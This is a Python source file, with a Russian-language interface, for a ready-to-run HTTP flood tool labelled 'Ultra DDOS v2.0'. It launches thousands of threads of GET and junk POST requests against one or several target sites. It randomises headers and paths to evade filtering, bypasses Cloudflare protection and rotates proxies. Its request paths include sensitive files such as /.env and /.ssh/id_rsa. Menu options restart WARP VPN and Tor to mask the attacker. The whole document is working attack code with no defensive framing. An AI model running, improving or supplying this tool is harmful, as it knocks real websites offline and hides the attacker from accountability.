
import os
import sys
import time
import random
import json
import threading
import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin
import psutil

# ================= ВКЛЮЧАЕМ ANSI ДЛЯ WINDOWS =================
if os.name == 'nt':
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except:
        pass

# ================= НАСТРОЙКИ =================
MAX_THREADS = 5000
TIMEOUT = 3
MAX_RETRIES = 3

# ================= ЗЕЛЁНЫЙ ГРАДИЕНТ =================
G1 = "\033[38;2;0;60;0m"
G2 = "\033[38;2;0;90;0m"
G3 = "\033[38;2;0;120;0m"
G4 = "\033[38;2;0;160;0m"
G5 = "\033[38;2;0;200;0m"
G6 = "\033[38;2;0;230;0m"
G7 = "\033[38;2;50;255;50m"
GW = "\033[38;2;200;255;200m"

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
E = "\033[0m"

# ================= РАСШИРЕННЫЙ СПИСОК USER-AGENTS =================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
]

# ================= ОБХОД CLOUDFLARE =================
try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except:
    CLOUDSCRAPER_AVAILABLE = False

# ================= СЛУЧАЙНЫЕ ЗАГОЛОВКИ =================
def random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json', 'text/plain']),
        'Accept-Language': random.choice(['ru-RU,ru;q=0.9,en;q=0.8', 'en-US,en;q=0.9', 'de-DE,de;q=0.8,en;q=0.7', 'fr-FR,fr;q=0.9,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        'Connection': random.choice(['keep-alive', 'close']),
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script', 'style', 'image']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
        'Pragma': random.choice(['no-cache', '']),
        'DNT': '1',
    }

# ================= СЛУЧАЙНЫЕ ПАРАМЕТРЫ =================
def random_params():
    params = {
        't': random.randint(1000, 99999),
        'r': random.random(),
        'sid': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz123456789', k=random.randint(6, 12))),
        'v': random.randint(1, 10),
        'cb': str(random.randint(100000, 999999)),
        'rand': random.randint(10000, 99999),
        'timestamp': str(int(time.time() * 1000) + random.randint(-10000, 10000)),
    }
    for _ in range(random.randint(1, 5)):
        key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
        value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz123456789', k=random.randint(5, 15)))
        params[key] = value
    return params

# ================= СЛУЧАЙНЫЙ ПУТЬ =================
def random_path(base_url):
    paths = [
        '/', '/index.html', '/index.php', '/index.asp', '/index.aspx',
        '/api/v1/test', '/api/v2/data', '/api/v3/status', '/api/v4/info',
        '/images/logo.png', '/images/banner.jpg', '/images/favicon.ico',
        '/css/style.css', '/css/main.css', '/css/bootstrap.css',
        '/js/script.js', '/js/main.js', '/js/jquery.js', '/js/app.js',
        '/wp-content/themes/twentythree/style.css', '/wp-content/plugins/plugin.js',
        '/static/css/main.css', '/static/js/main.js', '/static/img/logo.png',
        '/assets/css/style.css', '/assets/js/script.js', '/assets/img/bg.jpg',
        '/media/js/main.js', '/media/css/style.css',
        '/robots.txt', '/sitemap.xml', '/ads.txt', '/humans.txt',
        '/.env', '/.git/config', '/.htaccess', '/.ssh/id_rsa',
        '/backup.sql', '/dump.sql', '/database.sql',
        '/config.php', '/settings.ini', '/config.json',
        '/vendor/autoload.php', '/vendor/composer/installed.json',
        '/node_modules/package.json', '/package.json', '/composer.json',
        '/about', '/contact', '/products', '/services', '/blog',
        '/category', '/tag', '/author', '/search',
        '/login', '/register', '/forgot-password', '/profile',
    ]
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    return base + random.choice(paths)

# ================= ЗАГРУЗКА ПРОКСИ =================
def load_proxies():
    proxies = []
    try:
        with open('proxies.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if '@' in line:
                        auth, addr = line.split('@')
                        user, passwd = auth.split(':')
                        proxies.append({
                            'http': f'http://{user}:{passwd}@{addr}',
                            'https': f'http://{user}:{passwd}@{addr}'
                        })
                    else:
                        proxies.append({
                            'http': f'http://{line}',
                            'https': f'http://{line}'
                        })
        return proxies
    except:
        return []

# ================= СТАТИСТИКА =================
def load_stats():
    try:
        with open('stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"attacks": 0, "requests": 0, "success": 0, "errors": 0}

def save_stats(s):
    with open('stats.json', 'w') as f:
        json.dump(s, f, indent=4)

def update_stats(a):
    s = load_stats()
    s["attacks"] += 1
    s["requests"] += a.req
    s["success"] += a.ok
    s["errors"] += a.err
    save_stats(s)

# ================= ВСПОМОГАТЕЛЬНЫЕ =================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def safe_int(prompt, default=100, min_val=1, max_val=5000):
    while True:
        u = input(prompt)
        if u == "":
            return default
        try:
            v = int(u)
            if min_val <= v <= max_val:
                return v
            else:
                print(f"{R}Введите число от {min_val} до {max_val}{E}")
        except:
            print(f"{R}Введите число!{E}")

def bar(p, w=20):
    p = max(0, min(100, p))
    f = int(w * p / 100)
    return f"[{G7 + '█' * f + E + '░' * (w - f)}] {p}%"

def check_cpu():
    try:
        return psutil.cpu_percent(interval=0.1)
    except:
        return 0

# ================= БАННЕР =================
def banner():
    clear()
    print(f"""
{G1} ██    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄         ▓█████▄ ▓█████▄  ▒█████    ██████ {E}
{G2}  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄       ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ {E}
{G3}  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄     ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   {E}
{G4}  ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒{E}
{G5}  ▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒{E}
{G6}  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░{E}
{G5}  ░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░{E}
{G3}   ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  {E}
{G2}     ░         ░  ░          ░           ░  ░      ░       ░        ░ ░        ░  {E}
{G1}                                               ░       ░                           {E}
{G7}████████  █████  ██████  ██ ███████ ████████ ███████{E}
{G7}   ██    ██   ██ ██   ██ ██ ██         ██    ██{E}
{G7}   ██    ███████ ██████  ██ ███████    ██    █████{E}
{G7}   ██    ██   ██ ██   ██ ██      ██    ██    ██{E}
{G7}   ██    ██   ██ ██   ██ ██ ███████    ██    ███████{E}
{G5}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G7}Ultra DDOS v2.0 | Developer: verifactor @newince
{G5}Максимум потоков: {W}{MAX_THREADS}
{G5}Загружено прокси: {W}{len(load_proxies())}
{G5}Обход Cloudflare: {W}{"✅" if CLOUDSCRAPER_AVAILABLE else "❌ (pip install cloudscraper)"}
{G5}CPU: {W}{check_cpu():.0f}%  {G5}RAM: {W}{psutil.virtual_memory().percent:.0f}%{E}
{E}
""")

# ================= МОЩНАЯ АТАКА =================
class Attack:
    def __init__(self, name="", proxies=None, use_cloudscraper=False, mode="normal", auto_tune=False, duration=0):
        self.name = name
        self.running = False
        self.req = 0
        self.ok = 0
        self.err = 0
        self.ban = 0
        self.bytes = 0
        self.start = 0
        self.lock = threading.Lock()
        self.proxies = proxies or []
        self.proxy_index = 0
        self.proxy_lock = threading.Lock()
        self.mode = mode
        self.auto_tune = auto_tune
        self.duration = duration
        self.current_threads = 0
        
        self.use_cloudscraper = use_cloudscraper and CLOUDSCRAPER_AVAILABLE
        if self.use_cloudscraper:
            self.scraper = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': 'windows',
                    'mobile': False
                }
            )
        else:
            self.session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=200,
                pool_maxsize=200,
                max_retries=3
            )
            self.session.mount('http://', adapter)
            self.session.mount('https://', adapter)

    def get_proxy(self):
        if not self.proxies:
            return None
        with self.proxy_lock:
            proxy = self.proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
            return proxy

    def make_request(self, url):
        try:
            proxy = self.get_proxy()
            headers = random_headers()
            params = random_params()
            path_url = random_path(url)
            
            if random.random() > 0.5:
                path_url += f'#{random.randint(1000, 9999)}'
            
            method = random.choice(['GET', 'POST']) if self.mode == "mixed" else "GET"
            
            if self.mode == "post" or method == "POST":
                size = random.randint(1024, 1024*1024)
                data = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=size))
                
                if self.use_cloudscraper:
                    response = self.scraper.post(
                        path_url,
                        params=params,
                        data=data,
                        headers=headers,
                        proxies=proxy,
                        timeout=TIMEOUT
                    )
                else:
                    response = self.session.post(
                        path_url,
                        params=params,
                        data=data,
                        headers=headers,
                        proxies=proxy,
                        timeout=TIMEOUT
                    )
            else:
                if self.use_cloudscraper:
                    response = self.scraper.get(
                        path_url,
                        params=params,
                        headers=headers,
                        proxies=proxy,
                        timeout=TIMEOUT,
                        allow_redirects=True
                    )
                else:
                    response = self.session.get(
                        path_url,
                        params=params,
                        headers=headers,
                        proxies=proxy,
                        timeout=TIMEOUT,
                        allow_redirects=True
                    )
            
            with self.lock:
                self.req += 1
                self.bytes += len(response.content)
                
                if response.status_code in [200, 201, 202, 204, 301, 302, 303, 304, 307, 308, 404]:
                    self.ok += 1
                elif response.status_code in [403, 429, 503, 401, 405, 406, 407, 408, 410, 413, 414, 415, 416, 417]:
                    self.ban += 1
                    self.err += 1
                else:
                    self.err += 1
                    
        except:
            with self.lock:
                self.req += 1
                self.err += 1

    def start_http(self, url, threads):
        self.running = True
        self.req = self.ok = self.err = self.ban = self.bytes = 0
        self.start = time.time()
        self.current_threads = threads
        
        def worker():
            while self.running:
                try:
                    self.make_request(url)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
        
        while self.running:
            if self.duration > 0 and time.time() - self.start > self.duration:
                self.running = False
                break
            
            if self.auto_tune and self.err < 10:
                cpu = check_cpu()
                if cpu < 80 and self.current_threads < MAX_THREADS:
                    new_threads = min(self.current_threads + 10, MAX_THREADS)
                    for _ in range(new_threads - self.current_threads):
                        t = threading.Thread(target=worker, daemon=True)
                        t.start()
                    self.current_threads = new_threads
            
            time.sleep(0.1)
        
        for t in threading.enumerate():
            if t != threading.current_thread() and t.is_alive():
                try:
                    t.join(timeout=0.1)
                except:
                    pass

    def stop(self):
        self.running = False

# ================= ВЫВОД СТАТУСА =================
def show_attack_status(attacks):
    sys.stdout.write('\033[H')
    sys.stdout.flush()
    
    if not attacks:
        return
    
    total_req = sum(a.req for a in attacks)
    total_ok = sum(a.ok for a in attacks)
    total_err = sum(a.err for a in attacks)
    total_ban = sum(a.ban for a in attacks)
    total_bytes = sum(a.bytes for a in attacks)
    total_elapsed = int(time.time() - attacks[0].start) if attacks and attacks[0].start else 0
    
    rate = int(total_req / total_elapsed) if total_elapsed > 0 else 0
    load = min(100, int((rate / 100) * 100)) if rate > 0 else 0
    
    cpu = check_cpu()
    ram = psutil.virtual_memory().percent
    
    output = f"""
{G7}💀 {'КОМБО-АТАКА' if len(attacks) > 1 else 'АТАКА'} В ПРОЦЕССЕ 💀
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{G6}Активных атак: {W}{len(attacks)}
{R}Всего запросов: {W}{total_req:,}
{G}Успешно: {W}{total_ok:,}
{R}Ошибки: {W}{total_err:,}
{Y}Бан: {W}{total_ban}
{C}Данные: {W}{total_bytes/1024/1024:.1f} MB
{C}Скорость: {W}{rate:,} r/s
{C}Нагрузка: {W}{bar(load)}
{C}Время: {W}{total_elapsed//3600:02d}:{total_elapsed%3600//60:02d}:{total_elapsed%60:02d}
{C}CPU: {W}{cpu:.0f}%  {C}RAM: {W}{ram:.0f}%
{G6}Режим: {W}{attacks[0].mode.upper() if attacks else 'NORMAL'}
{G6}Потоков: {W}{attacks[0].current_threads if attacks else 0}

{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    for i, a in enumerate(attacks, 1):
        elapsed = int(time.time() - a.start) if a.start else 0
        rate_a = int(a.req / elapsed) if elapsed > 0 else 0
        load_a = min(100, int((rate_a / 50) * 100)) if rate_a > 0 else 0
        
        output += f"""
{G5}[{i}] {a.name}
{G6}  Запросы: {W}{a.req:,}  {G}✓{a.ok}  {R}✗{a.err}{E}  {Y}🚫{a.ban}{E}  {G7}{bar(load_a)}{E}
{G6}  Скорость: {W}{rate_a} r/s  {G6}Время: {elapsed}с
"""
    
    output += f"""
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G7}[Press ENTER to stop all] | [Ctrl+C] - экстренная остановка
{G6}Cloudflare обход: {W}{"✅ Включен" if attacks[0].use_cloudscraper else "❌ Выключен"}
{E}
"""
    sys.stdout.write('\033[J' + output)
    sys.stdout.flush()

# ================= ОДИНОЧНАЯ АТАКА =================
def single_attack():
    clear()
    banner()
    
    print(f"{G7}💀 МОЩНАЯ АТАКА 💀{E}")
    url = input(f"{G6}URL: {W}")
    if not url:
        print(f"{R}Ошибка! URL не может быть пустым{E}")
        time.sleep(1)
        return
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(f"""
{G6}Выбери режим атаки:
{G5}1.{W} NORMAL (GET запросы)
{G5}2.{W} POST (мусорные данные)
{G5}3.{W} MIXED (GET + POST){E}
""")
    mode_choice = input(f"{G7}Режим: {W}")
    modes = {'1': 'normal', '2': 'post', '3': 'mixed'}
    mode = modes.get(mode_choice, 'normal')
    
    threads = safe_int(f"{G6}Потоки (1-{MAX_THREADS}): {W}", 100, 1, MAX_THREADS)
    duration = safe_int(f"{G6}Время атаки (сек, 0 = бесконечно): {W}", 0, 0, 3600)
    auto_tune = input(f"{G6}Авто-тюнинг? (y/n): {W}").lower() == 'y'
    use_cf = CLOUDSCRAPER_AVAILABLE and input(f"{G6}Обход Cloudflare? (y/n): {W}").lower() == 'y'
    
    proxies = load_proxies()
    if not proxies:
        print(f"{Y}⚠ Прокси не найдены! Работа без прокси — ваш IP будет забанен{E}")
        time.sleep(1)
    
    print(f"{G6}Запуск с {threads} потоками...{E}")
    time.sleep(0.5)
    
    a = Attack(
        name=f"💀 {mode.upper()} ({threads} потоков)",
        proxies=proxies,
        use_cloudscraper=use_cf,
        mode=mode,
        auto_tune=auto_tune,
        duration=duration
    )
    
    t = threading.Thread(target=a.start_http, args=(url, threads), daemon=True)
    t.start()
    
    stop = [False]
    def wait():
        input()
        stop[0] = True
        a.stop()
    threading.Thread(target=wait, daemon=True).start()
    
    try:
        while a.running and not stop[0]:
            show_attack_status([a])
            time.sleep(0.1)
    except KeyboardInterrupt:
        a.stop()
    
    a.stop()
    t.join(timeout=0.5)
    
    update_stats(a)
    
    clear()
    banner()
    print(f"""
{G7}💀 АТАКА ЗАВЕРШЕНА 💀

{R}Запросы: {W}{a.req:,}
{G}Успешно: {W}{a.ok:,}
{R}Ошибки: {W}{a.err:,}
{Y}Бан: {W}{a.ban}
{C}Режим: {W}{mode.upper()}
{C}Потоки: {W}{threads}
{C}Время: {W}{int(time.time() - a.start)} сек
{C}Скорость: {W}{int(a.req / (time.time() - a.start)) if (time.time() - a.start) > 0 else 0} r/s
{E}
""")
    input(f"{G7}Нажми ENTER для возврата...{E}")

# ================= КОМБО-АТАКА =================
def combo_attack():
    clear()
    banner()
    
    print(f"{G7}💀 КОМБО-АТАКА (несколько целей сразу) 💀{E}")
    print(f"{G6}Введи цели через запятую (например: site1.com, site2.com, site3.com){E}")
    targets = input(f"{W}Цели: {E}")
    
    urls = [t.strip() for t in targets.split(',') if t.strip()]
    if not urls:
        print(f"{R}Ошибка! Нет целей{E}")
        time.sleep(1)
        return
    
    urls = [u if u.startswith('http') else 'http://' + u for u in urls]
    
    threads_per_target = safe_int(f"{G6}Потоков на цель (1-{MAX_THREADS}): {W}", 50, 1, MAX_THREADS)
    
    print(f"""
{G6}Выбери режим атаки:
{G5}1.{W} NORMAL (GET запросы)
{G5}2.{W} POST (мусорные данные)
{G5}3.{W} MIXED (GET + POST){E}
""")
    mode_choice = input(f"{G7}Режим: {W}")
    modes = {'1': 'normal', '2': 'post', '3': 'mixed'}
    mode = modes.get(mode_choice, 'normal')
    
    duration = safe_int(f"{G6}Время атаки (сек, 0 = бесконечно): {W}", 0, 0, 3600)
    auto_tune = input(f"{G6}Авто-тюнинг? (y/n): {W}").lower() == 'y'
    use_cf = CLOUDSCRAPER_AVAILABLE and input(f"{G6}Обход Cloudflare? (y/n): {W}").lower() == 'y'
    
    proxies = load_proxies()
    if not proxies:
        print(f"{Y}⚠ Прокси не найдены! Работа без прокси — ваш IP будет забанен{E}")
        time.sleep(1)
    
    print(f"\n{G6}Запускаю {len(urls)} атак по {threads_per_target} потоков...{E}")
    time.sleep(0.5)
    
    attacks = []
    for i, url in enumerate(urls, 1):
        a = Attack(
            name=f"💀 {mode.upper()} Target {i}: {url[:20]}... ({threads_per_target} потоков)",
            proxies=proxies,
            use_cloudscraper=use_cf,
            mode=mode,
            auto_tune=auto_tune,
            duration=duration
        )
        t = threading.Thread(target=a.start_http, args=(url, threads_per_target), daemon=True)
        t.start()
        attacks.append(a)
        time.sleep(0.2)
    
    stop = [False]
    def wait():
        input()
        stop[0] = True
        for a in attacks:
            a.stop()
    threading.Thread(target=wait, daemon=True).start()
    
    try:
        while any(a.running for a in attacks) and not stop[0]:
            show_attack_status(attacks)
            time.sleep(0.1)
    except KeyboardInterrupt:
        for a in attacks:
            a.stop()
    
    for a in attacks:
        a.stop()
        time.sleep(0.1)
    
    for a in attacks:
        update_stats(a)
    
    clear()
    banner()
    
    total_req = sum(a.req for a in attacks)
    total_ok = sum(a.ok for a in attacks)
    total_err = sum(a.err for a in attacks)
    total_ban = sum(a.ban for a in attacks)
    
    print(f"""
{G7}💀 КОМБО-АТАКА ЗАВЕРШЕНА 💀

{R}Всего атак: {W}{len(attacks)}
{R}Всего запросов: {W}{total_req:,}
{G}Успешно: {W}{total_ok:,}
{R}Ошибки: {W}{total_err:,}
{Y}Бан: {W}{total_ban}
{C}Режим: {W}{mode.upper()}
{C}Время: {W}{int(time.time() - attacks[0].start)} сек

{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G5}Детали по целям:{E}
""")
    
    for i, a in enumerate(attacks, 1):
        print(f"{G5}[{i}] {a.name} — {G}✓{a.ok} {R}✗{a.err} {Y}🚫{a.ban}{E}")
    
    print(f"\n{G7}Нажми ENTER для возврата...{E}")
    input()

# ================= МЕНЮ =================
def menu():
    clear()
    banner()
    print(f"""
{G7}ГЛАВНОЕ МЕНЮ

{G6}1.{G7} Одиночная атака (мощная)
{G6}2.{G7} КОМБО-АТАКА (несколько целей)
{G6}3.{G7} Перезапустить WARP VPN
{G6}4.{G7} Перезапустить Tor
{G5}99.{G7} Exit
{E}
""")

# ================= MAIN =================
def main():
    while True:
        menu()
        try:
            ch = input(f"{G7}Выбери: {W}")
        except KeyboardInterrupt:
            print(f"\n{G7}Выход...{E}")
            sys.exit()
            
        if ch == '1':
            single_attack()
        elif ch == '2':
            combo_attack()
        elif ch == '3':
            print(f"{G6}Перезапуск WARP...{E}")
            try:
                os.system("warp-cli disconnect && warp-cli connect")
                print(f"{G7}✅ WARP перезапущен{E}")
            except:
                print(f"{R}❌ Ошибка! Установи WARP{E}")
            time.sleep(2)
        elif ch == '4':
            print(f"{G6}Перезапуск Tor...{E}")
            try:
                if os.name == 'nt':
                    os.system("taskkill /F /IM tor.exe && start tor.exe")
                else:
                    os.system("service tor restart")
                print(f"{G7}✅ Tor перезапущен{E}")
            except:
                print(f"{R}❌ Ошибка! Установи Tor{E}")
            time.sleep(2)
        elif ch == '99':
            clear()
            print(f"{G7}Выход...{E}")
            sys.exit()
        else:
            print(f"{R}Неверный выбор!{E}")
            time.sleep(1)

if __name__ == "__main__":
    main()
